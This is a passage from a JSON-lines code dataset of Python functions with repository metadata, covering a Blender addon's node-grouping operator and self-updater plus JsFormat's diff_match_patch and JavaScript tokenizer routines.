node_group.nodes.new(\"NodeGroupOutput\")\ngroup_input.location = Vector((loc_x_in-200, loc_avg[1]))\ngroup_output.location = Vector((loc_x_out+200, loc_avg[1]))\n\n# Copy the selected nodes from current nodetree\nif (nodes_len > 0):\n    bpy.ops.node.clipboard_copy(get_override(type='NODE_EDITOR'))\n\n# Create a grouped node with correct location and assign newly created group\ngroup_node = node_tree.nodes.new(\"ScNodeGroup\")\ngroup_node.location = loc_avg\ngroup_node.node_tree = node_group\n\n# Add overlay to node editor for the newly created group\npath.append(node_group, node=group_node)\n\n# Paste the copied nodes to newly created group\nif (nodes_len > 0):\n    bpy.ops.node.clipboard_paste(get_override(type='NODE_EDITOR'))\n\n# Create group input/output links in the newly created group\no = group_input.outputs\nfor link in links_external_in:\n    # node_group.links.new(o.get(link.from_socket.name, o[len(o)-1]), node_group.nodes[link.to_node.name].inputs[link.to_socket.name])\n    node_group.links.new(group_input.outputs[''], node_group.nodes[link.to_node.name].inputs[link.to_socket.name])\ni = group_output.inputs\nfor link in links_external_out:\n    # node_group.links.new(node_group.nodes[link.from_node.name].outputs[link.from_socket.name], i.get(link.to_socket.name, i[len(i)-1]))\n    node_group.links.new(node_group.nodes[link.from_node.name].outputs[link.from_socket.name], group_output.inputs[''])\n\n# Add new links to grouped node from original external links\nfor i in range(0, len(links_external_in)):\n    link = links_external_in[i]\n    node_tree.links.new(link.from_node.outputs[link.from_socket.name], group_node.inputs[i])\nfor i in range(0, len(links_external_out)):\n    link = links_external_out[i]\n    node_tree.links.new(group_node.outputs[i], link.to_node.inputs[link.to_socket.name])\n\n# Remove redundant selected nodes\nfor n in selected_nodes:\n    node_tree.nodes.remove(n)\n\nreturn {\"FINISHED\"}", "path": "Sorcar/operators/ScGroupNodes.py", "commit_date": "2020-06-20 00:00:00", "repo_name": "aachman98/Sorcar", "stars": 1150, "license": "gpl-3.0", "language": "python", "size": 12404}
{"docstring": "\"\"\"Unzip the downloaded file, and validate contents\"\"\"\n", "func_signal": "def unpack_staged_zip(self,clean=False):\n", "code": "if os.path.isfile(self._source_zip) == False:\n\tif self._verbose: print(\"Error, update zip not found\")\n\tself._error = \"Install failed\"\n\tself._error_msg = \"Downloaded zip not found\"\n\treturn -1\n\n# clear the existing source folder in case previous files remain\noutdir = os.path.join(self._updater_path, \"source\")\ntry:\n\tshutil.rmtree(outdir)\n\tos.makedirs(outdir)\n\tif self._verbose:\n\t\tprint(\"Source folder cleared and recreated\")\nexcept:\n\tpass\n\n# Create parent directories if needed, would not be relevant unless\n# installing addon into another location or via an addon manager\ntry:\n\tos.mkdir(outdir)\nexcept Exception as err:\n\tprint(\"Error occurred while making extract dir:\")\n\tprint(str(err))\n\tself._error = \"Install failed\"\n\tself._error_msg = \"Failed to make extract directory\"\n\treturn -1\n\nif not os.path.isdir(outdir):\n\tprint(\"Failed to create source directory\")\n\tself._error = \"Install failed\"\n\tself._error_msg = \"Failed to create extract directory\"\n\treturn -1\n\nif self._verbose:\n\tprint(\"Begin extracting source from zip:\", self._source_zip)\nzfile = zipfile.ZipFile(self._source_zip, \"r\")\n\nif not zfile:\n\tif self._verbose:\n\t\tprint(\"Resulting file is not a zip, cannot extract\")\n\tself._error = \"Install failed\"\n\tself._error_msg = \"Resulting file is not a zip, cannot extract\"\n\treturn -1\n\n# Now extract directly from the first subfolder (not root)\n# this avoids adding the first subfolder to the path length,\n# which can be too long if the download has the SHA in the name\nzsep = '/'  #os.sep  # might just always be / even on windows\nfor name in zfile.namelist():\n\tif zsep not in name:\n\t\tcontinue\n\ttop_folder = name[:name.index(zsep)+1]\n\tif name == top_folder + zsep:\n\t\tcontinue  # skip top level folder\n\tsubpath = name[name.index(zsep)+1:]\n\tif name.endswith(zsep):\n\t\ttry:\n\t\t\tos.mkdir(os.path.join(outdir, subpath))\n\t\t\tif self._verbose:\n\t\t\t\tprint(\"Extract - mkdir: \", os.path.join(outdir, subpath))\n\t\texcept OSError as exc:\n\t\t\tif exc.errno != errno.EEXIST:\n\t\t\t\tself._error = \"Install failed\"\n\t\t\t\tself._error_msg = \"Could not create folder from zip\"\n\t\t\t\treturn -1\n\telse:\n\t\twith open(os.path.join(outdir, subpath), \"wb\") as outfile:\n\t\t\tdata = zfile.read(name)\n\t\t\toutfile.write(data)\n\t\t\tif self._verbose:\n\t\t\t\tprint(\"Extract - create:\", os.path.join(outdir, subpath))\n\nif self._verbose:\n\tprint(\"Extracted source\")\n\nunpath = os.path.join(self._updater_path, \"source\")\nif not os.path.isdir(unpath):\n\tself._error = \"Install failed\"\n\tself._error_msg = \"Extracted path does not exist\"\n\tprint(\"Extracted path does not exist: \", unpath)\n\treturn -1\n\nif self._subfolder_path:\n\tself._subfolder_path.replace('/', os.path.sep)\n\tself._subfolder_path.replace('\\\\', os.path.sep)\n\n# either directly in root of zip/one subfolder, or use specified path\nif os.path.isfile(os.path.join(unpath,\"__init__.py\")) == False:\n\tdirlist = os.listdir(unpath)\n\tif len(dirlist)>0:\n\t\tif self._subfolder_path == \"\" or self._subfolder_path == None:\n\t\t\tunpath = os.path.join(unpath, dirlist[0])\n\t\telse:\n\t\t\tunpath = os.path.join(unpath, self._subfolder_path)\n\n\t# smarter check for additional sub folders for a single folder\n\t# containing __init__.py\n\tif os.path.isfile(os.path.join(unpath,\"__init__.py\")) == False:\n\t\tif self._verbose:\n\t\t\tprint(\"not a valid addon found\")\n\t\t\tprint(\"Paths:\")\n\t\t\tprint(dirlist)\n\t\tself._error = \"Install failed\"\n\t\tself._error_msg = \"No __init__ file found in new source\"\n\t\treturn -1\n\n# merge code with running addon directory, using blender default behavior\n# plus any modifiers indicated by user (e.g. force remove/keep)\nself.deepMergeDirectory(self._addon_root, unpath, clean)\n\n# Now save the json state\n#  Change to True, to trigger the handler on other side\n#  if allowing reloading within same blender instance\nself._json[\"just_updated\"] = True\nself.save_updater_json()\nself.reload_addon()\nself._update_ready = False\nreturn 0", "path": "Sorcar/addon_updater.py", "commit_date": "2019-12-11 00:00:00", "repo_name": "aachman98/Sorcar", "stars": 1150, "license": "gpl-3.0", "language": "python", "size": 12404}
{"docstring": "# does not validate branch name.\n", "func_signal": "def form_branch_list_url(self, updater):\n", "code": "return \"{}{}\".format(\n\tself.form_repo_url(updater),\n\t\"/repository/branches\")", "path": "Sorcar/addon_updater.py", "commit_date": "2019-12-11 00:00:00", "repo_name": "aachman98/Sorcar", "stars": 1150, "license": "gpl-3.0", "language": "python", "size": 12404}
{"docstring": "# enabled = False, default initially will not check against frequency\n# if enabled, default is then 2 weeks\n\n", "func_signal": "def set_check_interval(self,enable=False,months=0,days=14,hours=0,minutes=0):\n", "code": "if type(enable) is not bool:\n\traise ValueError(\"Enable must be a boolean value\")\nif type(months) is not int:\n\traise ValueError(\"Months must be an integer value\")\nif type(days) is not int:\n\traise ValueError(\"Days must be an integer value\")\nif type(hours) is not int:\n\traise ValueError(\"Hours must be an integer value\")\nif type(minutes) is not int:\n\traise ValueError(\"Minutes must be an integer value\")\n\nif enable==False:\n\tself._check_interval_enable = False\nelse:\n\tself._check_interval_enable = True\n\nself._check_interval_months = months\nself._check_interval_days = days\nself._check_interval_hours = hours\nself._check_interval_minutes = minutes", "path": "Sorcar/addon_updater.py", "commit_date": "2019-12-11 00:00:00", "repo_name": "aachman98/Sorcar", "stars": 1150, "license": "gpl-3.0", "language": "python", "size": 12404}
{"docstring": "\"\"\"Perform update check, run as target of background thread\"\"\"\n", "func_signal": "def async_check_update(self, now, callback=None):\n", "code": "self._async_checking = True\nif self._verbose:\n\tprint(\"{} BG thread: Checking for update now in background\".format(\n\t\tself._addon))\n\ntry:\n\tself.check_for_update(now=now)\nexcept Exception as exception:\n\tprint(\"Checking for update error:\")\n\tprint(exception)\n\tif not self._error:\n\t\tself._update_ready = False\n\t\tself._update_version = None\n\t\tself._update_link = None\n\t\tself._error = \"Error occurred\"\n\t\tself._error_msg = \"Encountered an error while checking for updates\"\n\nself._async_checking = False\nself._check_thread = None\n\nif self._verbose:\n\tprint(\"{} BG thread: Finished checking for update, doing callback\".format(self._addon))\nif callback:\n\tcallback(self._update_ready)", "path": "Sorcar/addon_updater.py", "commit_date": "2019-12-11 00:00:00", "repo_name": "aachman98/Sorcar", "stars": 1150, "license": "gpl-3.0", "language": "python", "size": 12404}
{"docstring": "\"\"\"Load or initialize JSON dictionary data for updater state\"\"\"\n", "func_signal": "def set_updater_json(self):\n", "code": "if self._updater_path == None:\n\traise ValueError(\"updater_path is not defined\")\nelif os.path.isdir(self._updater_path) == False:\n\tos.makedirs(self._updater_path)\n\njpath = self.get_json_path()\nif os.path.isfile(jpath):\n\twith open(jpath) as data_file:\n\t\tself._json = json.load(data_file)\n\t\tif self._verbose:\n\t\t\tprint(\"{} Updater: Read in JSON settings from file\".format(\n\t\t\t\tself._addon))\nelse:\n\t# set data structure\n\tself._json = {\n\t\t\"last_check\":\"\",\n\t\t\"backup_date\":\"\",\n\t\t\"update_ready\":False,\n\t\t\"ignore\":False,\n\t\t\"just_restored\":False,\n\t\t\"just_updated\":False,\n\t\t\"version_text\":{}\n\t}\n\tself.save_updater_json()", "path": "Sorcar/addon_updater.py", "commit_date": "2019-12-11 00:00:00", "repo_name": "aachman98/Sorcar", "stars": 1150, "license": "gpl-3.0", "language": "python", "size": 12404}
{"docstring": "# if post_update false, skip this function\n# else, unload/reload addon & trigger popup\n", "func_signal": "def reload_addon(self):\n", "code": "if self._auto_reload_post_update == False:\n\tprint(\"Restart blender to reload addon and complete update\")\n\treturn\n\nif self._verbose: print(\"Reloading addon...\")\naddon_utils.modules(refresh=True)\nbpy.utils.refresh_script_paths()\n\n# not allowed in restricted context, such as register module\n# toggle to refresh\nbpy.ops.wm.addon_disable(module=self._addon_package)\nbpy.ops.wm.addon_refresh()\nbpy.ops.wm.addon_enable(module=self._addon_package)", "path": "Sorcar/addon_updater.py", "commit_date": "2019-12-11 00:00:00", "repo_name": "aachman98/Sorcar", "stars": 1150, "license": "gpl-3.0", "language": "python", "size": 12404}
{"docstring": "\"\"\"Compute the Levenshtein distance; the number of inserted, deleted or\nsubstituted characters.\n\nArgs:\n  diffs: Array of diff tuples.\n\nReturns:\n  Number of changes.\n\"\"\"\n", "func_signal": "def diff_levenshtein(self, diffs):\n", "code": "levenshtein = 0\ninsertions = 0\ndeletions = 0\nfor (op, data) in diffs:\n  if op == self.DIFF_INSERT:\n    insertions += len(data)\n  elif op == self.DIFF_DELETE:\n    deletions += len(data)\n  elif op == self.DIFF_EQUAL:\n    # A deletion and an insertion is one substitution.\n    levenshtein += max(insertions, deletions)\n    insertions = 0\n    deletions = 0\nlevenshtein += max(insertions, deletions)\nreturn levenshtein", "path": "JsFormat/libs/diff_match_patch/python3/diff_match_patch.py", "commit_date": "2013-03-10 00:00:00", "repo_name": "jdavisclark/JsFormat", "stars": 1414, "license": "None", "language": "python", "size": 457}
{"docstring": "\"\"\"Inits a diff_match_patch object with default settings.\nRedefine these in your program to override the defaults.\n\"\"\"\n\n# Number of seconds to map a diff before giving up (0 for infinity).\n", "func_signal": "def __init__(self):\n", "code": "self.Diff_Timeout = 1.0\n# Cost of an empty edit operation in terms of edit characters.\nself.Diff_EditCost = 4\n# At what point is no match declared (0.0 = perfection, 1.0 = very loose).\nself.Match_Threshold = 0.5\n# How far to search for a match (0 = exact location, 1000+ = broad match).\n# A match this many characters away from the expected location will add\n# 1.0 to the score (0.0 is a perfect match).\nself.Match_Distance = 1000\n# When deleting a large block of text (over ~64 characters), how close do\n# the contents have to be to match the expected contents. (0.0 = perfection,\n# 1.0 = very loose).  Note that Match_Threshold controls how closely the\n# end points of a delete need to match.\nself.Patch_DeleteThreshold = 0.5\n# Chunk size for context length.\nself.Patch_Margin = 4\n\n# The number of bits in an int.\n# Python has no maximum, thus to disable patch splitting set to 0.\n# However to avoid long patches in certain pathological cases, use 32.\n# Multiple short patches (using native ints) are much faster than long ones.\nself.Match_MaxBits = 32", "path": "JsFormat/libs/diff_match_patch/python3/diff_match_patch.py", "commit_date": "2013-03-10 00:00:00", "repo_name": "jdavisclark/JsFormat", "stars": 1414, "license": "None", "language": "python", "size": 457}
{"docstring": "# You think that a regex would work for this\n# return s.replace(/\\\\x([0-9a-f]{2})/gi, function(match, val) {\n#         return String.fromCharCode(parseInt(val, 16));\n#     })\n# However, dealing with '\\xff', '\\\\xff', '\\\\\\xff' makes this more fun.\n", "func_signal": "def unescape_string(self, s):\n", "code": "out = self.acorn.six.u('')\nescaped = 0\n\ninput_scan = InputScanner(s)\nmatched = None\n\nwhile input_scan.hasNext():\n    # Keep any whitespace, non-slash characters\n    # also keep slash pairs.\n    matched = input_scan.match(re.compile(r'([\\s]|[^\\\\]|\\\\\\\\)+'))\n\n    if matched:\n        out += matched.group(0)\n\n    if input_scan.peek() != '\\\\':\n        continue\n\n    input_scan.next()\n    if input_scan.peek() == 'x':\n        matched = input_scan.match(re.compile('x([0-9A-Fa-f]{2})'))\n    elif input_scan.peek() == 'u':\n        matched = input_scan.match(re.compile('u([0-9A-Fa-f]{4})'));\n    else:\n        out += '\\\\'\n        if input_scan.hasNext():\n            out += input_scan.next()\n        continue\n\n    # If there's some error decoding, return the original string\n    if not matched:\n        return s\n\n    escaped = int(matched.group(1), 16)\n\n    if escaped > 0x7e and escaped <= 0xff and matched.group(0).startswith('x'):\n        # we bail out on \\x7f..\\xff,\n        # leaving whole string escaped,\n        # as it's probably completely binary\n        return s\n    elif escaped >= 0x00 and escaped < 0x20:\n        # leave 0x00...0x1f escaped\n        out += '\\\\' + matched.group(0)\n        continue\n    elif escaped == 0x22 or escaped == 0x27 or escaped == 0x5c:\n        # single-quote, apostrophe, backslash - escape these\n        out += ('\\\\' + chr(escaped))\n    else:\n        out += self.acorn.six.unichr(escaped)\n\nreturn out", "path": "JsFormat/libs/jsbeautifier/javascript/tokenizer.py", "commit_date": "2017-11-26 00:00:00", "repo_name": "jdavisclark/JsFormat", "stars": 1414, "license": "None", "language": "python", "size": 457}
{"docstring": "\"\"\"Increase the context until it is unique,\nbut don't let the pattern expand beyond Match_MaxBits.\n\nArgs:\n  patch: The patch to grow.\n  text: Source text.\n\"\"\"\n", "func_signal": "def patch_addContext(self, patch, text):\n", "code": "if len(text) == 0:\n  return\npattern = text[patch.start2 : patch.start2 + patch.length1]\npadding = 0\n\n# Look for the first and last matches of pattern in text.  If two different\n# matches are found, increase the pattern length.\nwhile (text.find(pattern) != text.rfind(pattern) and (self.Match_MaxBits ==\n    0 or len(pattern) < self.Match_MaxBits - self.Patch_Margin -\n    self.Patch_Margin)):\n  padding += self.Patch_Margin\n  pattern = text[max(0, patch.start2 - padding) :\n                 patch.start2 + patch.length1 + padding]\n# Add one chunk for good luck.\npadding += self.Patch_Margin\n\n# Add the prefix.\nprefix = text[max(0, patch.start2 - padding) : patch.start2]\nif prefix:\n  patch.diffs[:0] = [(self.DIFF_EQUAL, prefix)]\n# Add the suffix.\nsuffix = text[patch.start2 + patch.length1 :\n              patch.start2 + patch.length1 + padding]\nif suffix:\n  patch.diffs.append((self.DIFF_EQUAL, suffix))\n\n# Roll back the start points.\npatch.start1 -= len(prefix)\npatch.start2 -= len(prefix)\n# Extend lengths.\npatch.length1 += len(prefix) + len(suffix)\npatch.length2 += len(prefix) + len(suffix)", "path": "JsFormat/libs/diff_match_patch/python3/diff_match_patch.py", "commit_date": "2013-03-10 00:00:00", "repo_name": "jdavisclark/JsFormat", "stars": 1414, "license": "None", "language": "python", "size": 457}
{"docstring": "\"\"\"Look through the patches and break up any which are longer than the\nmaximum limit of the match algorithm.\nIntended to be called only from within patch_apply.\n\nArgs:\n  patches: Array of Patch objects.\n\"\"\"\n", "func_signal": "def patch_splitMax(self, patches):\n", "code": "patch_size = self.Match_MaxBits\nif patch_size == 0:\n  # Python has the option of not splitting strings due to its ability\n  # to handle integers of arbitrary precision.\n  return\nfor x in range(len(patches)):\n  if patches[x].length1 <= patch_size:\n    continue\n  bigpatch = patches[x]\n  # Remove the big old patch.\n  del patches[x]\n  x -= 1\n  start1 = bigpatch.start1\n  start2 = bigpatch.start2\n  precontext = ''\n  while len(bigpatch.diffs) != 0:\n    # Create one of several smaller patches.\n    patch = patch_obj()\n    empty = True\n    patch.start1 = start1 - len(precontext)\n    patch.start2 = start2 - len(precontext)\n    if precontext:\n      patch.length1 = patch.length2 = len(precontext)\n      patch.diffs.append((self.DIFF_EQUAL, precontext))\n\n    while (len(bigpatch.diffs) != 0 and\n           patch.length1 < patch_size - self.Patch_Margin):\n      (diff_type, diff_text) = bigpatch.diffs[0]\n      if diff_type == self.DIFF_INSERT:\n        # Insertions are harmless.\n        patch.length2 += len(diff_text)\n        start2 += len(diff_text)\n        patch.diffs.append(bigpatch.diffs.pop(0))\n        empty = False\n      elif (diff_type == self.DIFF_DELETE and len(patch.diffs) == 1 and\n          patch.diffs[0][0] == self.DIFF_EQUAL and\n          len(diff_text) > 2 * patch_size):\n        # This is a large deletion.  Let it pass in one chunk.\n        patch.length1 += len(diff_text)\n        start1 += len(diff_text)\n        empty = False\n        patch.diffs.append((diff_type, diff_text))\n        del bigpatch.diffs[0]\n      else:\n        # Deletion or equality.  Only take as much as we can stomach.\n        diff_text = diff_text[:patch_size - patch.length1 -\n                              self.Patch_Margin]\n        patch.length1 += len(diff_text)\n        start1 += len(diff_text)\n        if diff_type == self.DIFF_EQUAL:\n          patch.length2 += len(diff_text)\n          start2 += len(diff_text)\n        else:\n          empty = False\n\n        patch.diffs.append((diff_type, diff_text))\n        if diff_text == bigpatch.diffs[0][1]:\n          del bigpatch.diffs[0]\n        else:\n          bigpatch.diffs[0] = (bigpatch.diffs[0][0],\n                               bigpatch.diffs[0][1][len(diff_text):])\n\n    # Compute the head context for the next patch.\n    precontext = self.diff_text2(patch.diffs)\n    precontext = precontext[-self.Patch_Margin:]\n    # Append the end context for this patch.\n    postcontext = self.diff_text1(bigpatch.diffs)[:self.Patch_Margin]\n    if postcontext:\n      patch.length1 += len(postcontext)\n      patch.length2 += len(postcontext)\n      if len(patch.diffs) != 0 and patch.diffs[-1][0] == self.DIFF_EQUAL:\n        patch.diffs[-1] = (self.DIFF_EQUAL, patch.diffs[-1][1] +\n                           postcontext)\n      else:\n        patch.diffs.append((self.DIFF_EQUAL, postcontext))\n\n    if not empty:\n      x += 1\n      patches.insert(x, patch)", "path": "JsFormat/libs/diff_match_patch/python3/diff_match_patch.py", "commit_date": "2013-03-10 00:00:00", "repo_name": "jdavisclark/JsFormat", "stars": 1414, "license": "None", "language": "python", "size": 457}
{"docstring": "\"\"\"Add some padding on text start and end so that edges can match\nsomething.  Intended to be called only from within patch_apply.\n\nArgs:\n  patches: Array of Patch objects.\n\nReturns:\n  The padding string added to each side.\n\"\"\"\n", "func_signal": "def patch_addPadding(self, patches):\n", "code": "paddingLength = self.Patch_Margin\nnullPadding = \"\"\nfor x in range(1, paddingLength + 1):\n  nullPadding += chr(x)\n\n# Bump all the patches forward.\nfor patch in patches:\n  patch.start1 += paddingLength\n  patch.start2 += paddingLength\n\n# Add some padding on start of first diff.\npatch = patches[0]\ndiffs = patch.diffs\nif not diffs or diffs[0][0] != self.DIFF_EQUAL:\n  # Add nullPadding equality.\n  diffs.insert(0, (self.DIFF_EQUAL, nullPadding))\n  patch.start1 -= paddingLength  # Should be 0.\n  patch.start2 -= paddingLength  # Should be 0.\n  patch.length1 += paddingLength\n  patch.length2 += paddingLength\nelif paddingLength > len(diffs[0][1]):\n  # Grow first equality.\n  extraLength = paddingLength - len(diffs[0][1])\n  newText = nullPadding[len(diffs[0][1]):] + diffs[0][1]\n  diffs[0] = (diffs[0][0], newText)\n  patch.start1 -= extraLength\n  patch.start2 -= extraLength\n  patch.length1 += extraLength\n  patch.length2 += extraLength\n\n# Add some padding on end of last diff.\npatch = patches[-1]\ndiffs = patch.diffs\nif not diffs or diffs[-1][0] != self.DIFF_EQUAL:\n  # Add nullPadding equality.\n  diffs.append((self.DIFF_EQUAL, nullPadding))\n  patch.length1 += paddingLength\n  patch.length2 += paddingLength\nelif paddingLength > len(diffs[-1][1]):\n  # Grow last equality.\n  extraLength = paddingLength - len(diffs[-1][1])\n  newText = diffs[-1][1] + nullPadding[:extraLength]\n  diffs[-1] = (diffs[-1][0], newText)\n  patch.length1 += extraLength\n  patch.length2 += extraLength\n\nreturn nullPadding", "path": "JsFormat/libs/diff_match_patch/python3/diff_match_patch.py", "commit_date": "2013-03-10 00:00:00", "repo_name": "jdavisclark/JsFormat", "stars": 1414, "license": "None", "language": "python", "size": 457}
{"docstring": "\"\"\"Convert a diff array into a pretty HTML report.\n\nArgs:\n  diffs: Array of diff tuples.\n\nReturns:\n  HTML representation.\n\"\"\"\n", "func_signal": "def diff_prettyHtml(self, diffs):\n", "code": "html = []\nfor (op, data) in diffs:\n  text = (data.replace(\"&\", \"&amp;\").replace(\"<\", \"&lt;\")\n             .replace(\">\", \"&gt;\").replace(\"\\n\", \"&para;<br>\"))\n  if op == self.DIFF_INSERT:\n    html.append(\"<ins style=\\\"background:#e6ffe6;\\\">%s</ins>\" % text)\n  elif op == self.DIFF_DELETE:\n    html.append(\"<del style=\\\"background:#ffe6e6;\\\">%s</del>\" % text)\n  elif op == self.DIFF_EQUAL:\n    html.append(\"<span>%s</span>\" % text)\nreturn \"\".join(html)", "path": "JsFormat/libs/diff_match_patch/python3/diff_match_patch.py", "commit_date": "2013-03-10 00:00:00", "repo_name": "jdavisclark/JsFormat", "stars": 1414, "license": "None", "language": "python", "size": 457}
{"docstring": "\"\"\"Reduce the number of edits by eliminating operationally trivial\nequalities.\n\nArgs:\n  diffs: Array of diff tuples.\n\"\"\"\n", "func_signal": "def diff_cleanupEfficiency(self, diffs):\n", "code": "changes = False\nequalities = []  # Stack of indices where equalities are found.\nlastequality = None  # Always equal to diffs[equalities[-1]][1]\npointer = 0  # Index of current position.\npre_ins = False  # Is there an insertion operation before the last equality.\npre_del = False  # Is there a deletion operation before the last equality.\npost_ins = False  # Is there an insertion operation after the last equality.\npost_del = False  # Is there a deletion operation after the last equality.\nwhile pointer < len(diffs):\n  if diffs[pointer][0] == self.DIFF_EQUAL:  # Equality found.\n    if (len(diffs[pointer][1]) < self.Diff_EditCost and\n        (post_ins or post_del)):\n      # Candidate found.\n      equalities.append(pointer)\n      pre_ins = post_ins\n      pre_del = post_del\n      lastequality = diffs[pointer][1]\n    else:\n      # Not a candidate, and can never become one.\n      equalities = []\n      lastequality = None\n\n    post_ins = post_del = False\n  else:  # An insertion or deletion.\n    if diffs[pointer][0] == self.DIFF_DELETE:\n      post_del = True\n    else:\n      post_ins = True\n\n    # Five types to be split:\n    # <ins>A</ins><del>B</del>XY<ins>C</ins><del>D</del>\n    # <ins>A</ins>X<ins>C</ins><del>D</del>\n    # <ins>A</ins><del>B</del>X<ins>C</ins>\n    # <ins>A</del>X<ins>C</ins><del>D</del>\n    # <ins>A</ins><del>B</del>X<del>C</del>\n\n    if lastequality and ((pre_ins and pre_del and post_ins and post_del) or\n                         ((len(lastequality) < self.Diff_EditCost / 2) and\n                          (pre_ins + pre_del + post_ins + post_del) == 3)):\n      # Duplicate record.\n      diffs.insert(equalities[-1], (self.DIFF_DELETE, lastequality))\n      # Change second copy to insert.\n      diffs[equalities[-1] + 1] = (self.DIFF_INSERT,\n          diffs[equalities[-1] + 1][1])\n      equalities.pop()  # Throw away the equality we just deleted.\n      lastequality = None\n      if pre_ins and pre_del:\n        # No changes made which could affect previous entry, keep going.\n        post_ins = post_del = True\n        equalities = []\n      else:\n        if len(equalities):\n          equalities.pop()  # Throw away the previous equality.\n        if len(equalities):\n          pointer = equalities[-1]\n        else:\n          pointer = -1\n        post_ins = post_del = False\n      changes = True\n  pointer += 1\n\nif changes:\n  self.diff_cleanupMerge(diffs)", "path": "JsFormat/libs/diff_match_patch/python3/diff_match_patch.py", "commit_date": "2013-03-10 00:00:00", "repo_name": "jdavisclark/JsFormat", "stars": 1414, "license": "None", "language": "python", "size": 457}
{"docstring": "\"\"\"Initializes with an empty list of diffs.\n\"\"\"\n", "func_signal": "def __init__(self):\n", "code": "self.diffs = []\nself.start1 = None\nself.start2 = None\nself.length1 = 0\nself.length2 = 0", "path": "JsFormat/libs/diff_match_patch/python3/diff_match_patch.py", "commit_date": "2013-03-10 00:00:00", "repo_name": "jdavisclark/JsFormat", "stars": 1414, "license": "None", "language": "python", "size": 457}
{"docstring": "\"\"\"Find the differences between two texts.  Assumes that the texts do not\n  have any common prefix or suffix.\n\nArgs:\n  text1: Old string to be diffed.\n  text2: New string to be diffed.\n  checklines: Speedup flag.  If false, then don't run a line-level diff\n    first to identify the changed areas.\n    If true, then run a faster, slightly less optimal diff.\n  deadline: Time when the diff should be complete by.\n\nReturns:\n  Array of changes.\n\"\"\"\n", "func_signal": "def diff_compute(self, text1, text2, checklines, deadline):\n", "code": "if not text1:\n  # Just add some text (speedup).\n  return [(self.DIFF_INSERT, text2)]\n\nif not text2:\n  # Just delete some text (speedup).\n  return [(self.DIFF_DELETE, text1)]\n\nif len(text1) > len(text2):\n  (longtext, shorttext) = (text1, text2)\nelse:\n  (shorttext, longtext) = (text1, text2)\ni = longtext.find(shorttext)\nif i != -1:\n  # Shorter text is inside the longer text (speedup).\n  diffs = [(self.DIFF_INSERT, longtext[:i]), (self.DIFF_EQUAL, shorttext),\n           (self.DIFF_INSERT, longtext[i + len(shorttext):])]\n  # Swap insertions for deletions if diff is reversed.\n  if len(text1) > len(text2):\n    diffs[0] = (self.DIFF_DELETE, diffs[0][1])\n    diffs[2] = (self.DIFF_DELETE, diffs[2][1])\n  return diffs\n\nif len(shorttext) == 1:\n  # Single character string.\n  # After the previous speedup, the character can't be an equality.\n  return [(self.DIFF_DELETE, text1), (self.DIFF_INSERT, text2)]\n\n# Check to see if the problem can be split in two.\nhm = self.diff_halfMatch(text1, text2)\nif hm:\n  # A half-match was found, sort out the return data.\n  (text1_a, text1_b, text2_a, text2_b, mid_common) = hm\n  # Send both pairs off for separate processing.\n  diffs_a = self.diff_main(text1_a, text2_a, checklines, deadline)\n  diffs_b = self.diff_main(text1_b, text2_b, checklines, deadline)\n  # Merge the results.\n  return diffs_a + [(self.DIFF_EQUAL, mid_common)] + diffs_b\n\nif checklines and len(text1) > 100 and len(text2) > 100:\n  return self.diff_lineMode(text1, text2, deadline)\n\nreturn self.diff_bisect(text1, text2, deadline)", "path": "JsFormat/libs/diff_match_patch/python3/diff_match_patch.py", "commit_date": "2013-03-10 00:00:00", "repo_name": "jdavisclark/JsFormat", "stars": 1414, "license": "None", "language": "python", "size": 457}
{"docstring": "\"\"\"Reduce the number of edits by eliminating semantically trivial\nequalities.\n\nArgs:\n  diffs: Array of diff tuples.\n\"\"\"\n", "func_signal": "def diff_cleanupSemantic(self, diffs):\n", "code": "changes = False\nequalities = []  # Stack of indices where equalities are found.\nlastequality = None  # Always equal to diffs[equalities[-1]][1]\npointer = 0  # Index of current position.\n# Number of chars that changed prior to the equality.\nlength_insertions1, length_deletions1 = 0, 0\n# Number of chars that changed after the equality.\nlength_insertions2, length_deletions2 = 0, 0\nwhile pointer < len(diffs):\n  if diffs[pointer][0] == self.DIFF_EQUAL:  # Equality found.\n    equalities.append(pointer)\n    length_insertions1, length_insertions2 = length_insertions2, 0\n    length_deletions1, length_deletions2 = length_deletions2, 0\n    lastequality = diffs[pointer][1]\n  else:  # An insertion or deletion.\n    if diffs[pointer][0] == self.DIFF_INSERT:\n      length_insertions2 += len(diffs[pointer][1])\n    else:\n      length_deletions2 += len(diffs[pointer][1])\n    # Eliminate an equality that is smaller or equal to the edits on both\n    # sides of it.\n    if (lastequality and (len(lastequality) <=\n        max(length_insertions1, length_deletions1)) and\n        (len(lastequality) <= max(length_insertions2, length_deletions2))):\n      # Duplicate record.\n      diffs.insert(equalities[-1], (self.DIFF_DELETE, lastequality))\n      # Change second copy to insert.\n      diffs[equalities[-1] + 1] = (self.DIFF_INSERT,\n          diffs[equalities[-1] + 1][1])\n      # Throw away the equality we just deleted.\n      equalities.pop()\n      # Throw away the previous equality (it needs to be reevaluated).\n      if len(equalities):\n        equalities.pop()\n      if len(equalities):\n        pointer = equalities[-1]\n      else:\n        pointer = -1\n      # Reset the counters.\n      length_insertions1, length_deletions1 = 0, 0\n      length_insertions2, length_deletions2 = 0, 0\n      lastequality = None\n      changes = True\n  pointer += 1\n\n# Normalize the diff.\nif changes:\n  self.diff_cleanupMerge(diffs)\nself.diff_cleanupSemanticLossless(diffs)\n\n# Find any overlaps between deletions and insertions.\n# e.g: <del>abcxxx</del><ins>xxxdef</ins>\n#   -> <del>abc</del>xxx<ins>def</ins>\n# e.g: <del>xxxabc</del><ins>defxxx</ins>\n#   -> <ins>def</ins>xxx<del>abc</del>\n# Only extract an overlap if it is as big as the edit ahead or behind it.\npointer = 1\nwhile pointer < len(diffs):\n  if (diffs[pointer - 1][0] == self.DIFF_DELETE and\n      diffs[pointer][0] == self.DIFF_INSERT):\n    deletion = diffs[pointer - 1][1]\n    insertion = diffs[pointer][1]\n    overlap_length1 = self.diff_commonOverlap(deletion, insertion)\n    overlap_length2 = self.diff_commonOverlap(insertion, deletion)\n    if overlap_length1 >= overlap_length2:\n      if (overlap_length1 >= len(deletion) / 2.0 or\n          overlap_length1 >= len(insertion) / 2.0):\n        # Overlap found.  Insert an equality and trim the surrounding edits.\n        diffs.insert(pointer, (self.DIFF_EQUAL,\n                               insertion[:overlap_length1]))\n        diffs[pointer - 1] = (self.DIFF_DELETE,\n                              deletion[:len(deletion) - overlap_length1])\n        diffs[pointer + 1] = (self.DIFF_INSERT,\n                              insertion[overlap_length1:])\n        pointer += 1\n    else:\n      if (overlap_length2 >= len(deletion) / 2.0 or\n          overlap_length2 >= len(insertion) / 2.0):\n        # Reverse 